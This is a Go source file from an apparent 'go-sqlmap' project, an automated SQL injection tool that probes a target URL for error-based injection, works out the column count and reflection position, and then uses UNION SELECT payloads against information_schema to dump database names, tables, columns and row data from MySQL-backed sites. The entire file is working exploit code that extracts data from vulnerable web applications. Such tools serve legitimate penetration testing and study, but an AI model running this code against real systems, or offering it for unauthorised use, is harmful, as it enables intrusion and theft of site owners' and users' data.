package core

import (
	"bytes"
	"go-sqlmap/constant"
	"go-sqlmap/log"
	"go-sqlmap/util"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)

func DetectErrorBasedSqlInject(url string, method string) (bool, string) {
	for _, v := range constant.SuffixList {
		innerUrl := url + v
		code, _, body := util.Request(method, innerUrl, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(body)),
				strings.ToLower(constant.DetectedKeyword)) {
				log.Info("detected error based sql injection!")
				return true, innerUrl
			}
		}
	}
	log.Info("not detected error based sql injection!")
	os.Exit(-1)
	return false, ""
}

func GetSuffix(target string) (bool, string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod, target, nil, nil)
	for _, v := range constant.SuffixList {
		payload := target + v + constant.ErrorBasedSuffixPayload
		_, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
		if string(defaultBody) == string(body) {
			return true, v
		}
	}
	return false, ""
}

func GetOrderByNum(suffix string, url string) int {
	for i := 1; ; i++ {
		payload := url + suffix + constant.Space + constant.ErrorBasedOrderPayload +
			constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(body)),
				strings.ToLower(constant.OrderKeyword)) {
				return i
			}
		}
	}
}

func GetUnionSelectPos(suffix string, url string, key int) Pos {
	url = url + constant.ErrorBasedUnionCondition
	unionSql := bytes.Buffer{}
	unionSql.WriteString(url + suffix + constant.Space +
		constant.ErrorBasedUnionSelect + constant.Space)
	rand.Seed(time.Now().UnixNano())
	randMap := make(map[int]int)
	for i := 1; i < key; i++ {
		x := rand.Intn(constant.DefaultRandomRange)
		randMap[i] = x
		unionSql.WriteString(strconv.Itoa(x) + ",")
	}
	res := util.DeleteLastChar(unionSql.String())
	unionPayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, unionPayload, nil, nil)
	if code != -1 {
	}
	body := string(tempBody)
	pos := Pos{}
	for k, v := range randMap {
		index := strings.Index(body, strconv.Itoa(v))
		if index != -1 {
			pos.Key = k
			pos.StartIndex = index
			return pos
		}
	}
	return pos
}

func GetVersion(pos Pos, suffix string, url string, key int) string {
	url = url + constant.ErrorBasedUnionCondition
	versionSql := bytes.Buffer{}
	versionSql.WriteString(url + suffix + constant.Space +
		constant.ErrorBasedUnionSelect + constant.Space)
	for i := 1; i < key; i++ {
		versionSql.WriteString(constant.VersionFunc + ",")
	}
	res := util.DeleteLastChar(versionSql.String())
	versionPayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, versionPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("MySQL Version:" + result)
		return result
	}
	return ""
}

func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
	url = url + constant.ErrorBasedUnionCondition
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(url + suffix + constant.Space +
		constant.ErrorBasedUnionSelect + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString(constant.DatabaseFunc + ",")
	}
	r := []rune(databaseSql.String())
	res := string(r[:len(r)-1])
	databasePayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, databasePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("current database:" + result)
		return result
	}
	return ""
}

func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
	url = url + constant.ErrorBasedUnionCondition
	database := constant.ErrorBasedUnionSelect
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString("group_concat(schema_name),")
	}
	r := []rune(databaseSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20information_schema.schemata%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("get databases success")
		util.PrintDatabases(util.ConvertString(result))
		return result
	}
	return ""
}

func GetAllTables(pos Pos, suffix string, url string, key int, database string) string {
	url = url + constant.ErrorBasedUnionCondition
	tableSql := bytes.Buffer{}
	tableSql.WriteString(url + suffix + constant.Space + constant.ErrorBasedUnionSelect + constant.Space)
	for i := 1; i < key; i++ {
		tableSql.WriteString("group_concat(table_name),")
	}
	r := []rune(tableSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("get tables success")
		util.PrintTables(util.ConvertString(result))
		return result
	}
	return ""
}

func GetColumns(pos Pos, suffix string, url string, key int, database string, tableName string) string {
	url = url + constant.ErrorBasedUnionCondition
	columnSql := bytes.Buffer{}
	columnSql.WriteString(url + suffix + constant.Space +
		constant.ErrorBasedUnionSelect + constant.Space)
	for i := 1; i < key; i++ {
		columnSql.WriteString("group_concat(column_name),")
	}
	r := []rune(columnSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
		"'%20and%20table_schema='" + database + "'%20"
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("get columns success")
		util.PrintColumns(util.ConvertString(result))
		return result
	}
	return ""
}

func GetData(pos Pos, suffix string, url string, key int, database string, tableName string, columns []string) {
	url = url + constant.ErrorBasedUnionCondition
	dataSql := bytes.Buffer{}
	dataSql.WriteString(url + suffix + constant.Space +
		constant.ErrorBasedUnionSelect + constant.Space)
	for i := 1; i < key; i++ {
		prefix := "group_concat("
		for _, v := range columns {
			prefix = prefix + v + ",0x3a,"
		}
		innerR := []rune(prefix)
		innerRes := string(innerR[:len(innerR)-6])
		dataSql.WriteString(innerRes + "),")
	}
	r := []rune(dataSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20" + database + "." + tableName
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("Get Data Success")
		var output [][]string
		for _, v := range strings.Split(result, ",") {
			var temp []string
			params := strings.Split(v, ":")
			for _, innerV := range params {
				temp = append(temp, innerV)
			}
			output = append(output, temp)
		}
		util.PrintData(util.ConvertInterfaceArray(columns, output))
	}
}
